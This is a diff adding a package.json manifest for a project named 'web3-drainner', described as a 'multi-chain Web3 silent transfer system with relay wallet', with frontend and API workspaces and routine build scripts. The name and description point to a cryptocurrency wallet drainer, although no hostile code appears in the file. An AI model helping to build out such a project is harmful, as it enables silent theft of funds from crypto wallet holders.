@@ -1,0 +1,17 @@
+{
+  "name": "web3-drainner",
+  "version": "1.0.0",
+  "description": "Multi-chain Web3 silent transfer system with relay wallet",
+  "private": true,
+  "scripts": {
+    "dev:frontend": "cd frontend && npm run dev",
+    "dev:backend": "cd api && npm run dev",
+    "build:frontend": "cd frontend && npm run build",
+    "build": "npm run build:frontend",
+    "preview": "cd frontend && npm run preview"
+  },
+  "workspaces": [
+    "frontend",
+    "api"
+  ]
+}
